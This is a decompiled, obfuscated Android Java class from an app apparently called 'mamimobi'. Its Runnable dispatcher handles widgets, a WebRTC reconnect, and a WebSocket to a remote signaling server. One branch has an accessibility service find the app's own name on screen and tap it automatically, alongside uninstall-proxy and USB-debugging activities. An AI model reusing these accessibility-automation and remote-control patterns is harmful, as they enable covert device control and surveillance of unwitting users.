package defpackage;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.work.impl.WorkDatabaseVersions;
import com.google.android.material.sidesheet.SideSheetBehavior;
import com.google.android.material.textfield.TextInputLayout;
import com.mamimobi.AccessService;
import com.mamimobi.activity.UsbDebuggingActivity;
import com.mamimobi.activity.WakeScreenActivity;
import com.mamimobi.mipush.R$string;
import com.mamimobi.videostream.UninstallProxyActivity;
import io.nats.client.impl.SocketDataPortWithWriteTimeout;
import java.util.concurrent.CountDownLatch;
import org.webrtc.PeerConnection;
import org.webrtc.VideoFileRenderer;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class uv0 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ Object F;

    public /* synthetic */ uv0(int i, Object obj) {
        this.E = i;
        this.F = obj;
    }

    @Override // java.lang.Runnable
    public final void run() {
        AccessibilityNodeInfo rootInActiveWindow;
        switch (this.E) {
            case 0:
                eb ebVar = (eb) this.F;
                ebVar.c = false;
                SideSheetBehavior sideSheetBehavior = (SideSheetBehavior) ebVar.e;
                k51 k51Var = sideSheetBehavior.M;
                if (k51Var != null && k51Var.g()) {
                    ebVar.a(ebVar.b);
                    return;
                } else {
                    if (sideSheetBehavior.L == 2) {
                        sideSheetBehavior.x(ebVar.b);
                        return;
                    }
                    return;
                }
            case 1:
                ((SocketDataPortWithWriteTimeout) this.F).lambda$connect$1();
                return;
            case 2:
                ((CountDownLatch) this.F).countDown();
                return;
            case 3:
                ((TextInputLayout) this.F).H.requestLayout();
                return;
            case 4:
                AccessService accessService = AccessService.e0;
                accessService.getClass();
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) this.F;
                if ((accessibilityEvent.getEventType() == 2048 || accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 1) && (rootInActiveWindow = accessService.getRootInActiveWindow()) != null) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByText(accessService.getString(R$string.app_name))) {
                        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isLongClickable()) {
                            accessibilityNodeInfo.getBoundsInScreen(new Rect());
                            d91.j(accessService, (r2.left + r2.right) / 2, (r2.top + r2.bottom) / 2);
                            AccessService.a1.postDelayed(new r1(accessService, rootInActiveWindow, 0), 1000L);
                            return;
                        }
                    }
                    return;
                }
                return;
            case 5:
                ((UninstallProxyActivity) this.F).finish();
                return;
            case 6:
                ((UsbDebuggingActivity) this.F).finish();
                return;
            case 7:
                ((VideoFileRenderer) this.F).lambda$release$3();
                return;
            case 8:
                ((WakeScreenActivity) this.F).finish();
                return;
            case WorkDatabaseVersions.VERSION_9 /* 9 */:
                o71 o71Var = (o71) this.F;
                o71Var.getClass();
                try {
                    try {
                        o71Var.e.b("wss://app.mamimobi.vip/signaling");
                        break;
                    } catch (Exception e) {
                        e.printStackTrace();
                        break;
                    }
                    return;
                } finally {
                    o71Var.k = false;
                }
            default:
                o71 o71Var2 = ((m71) this.F).c;
                PeerConnection peerConnection = o71Var2.c;
                if (peerConnection == null || peerConnection.iceConnectionState() != PeerConnection.IceConnectionState.DISCONNECTED) {
                    return;
                }
                o71Var2.c.restartIce();
                return;
        }
    }
}
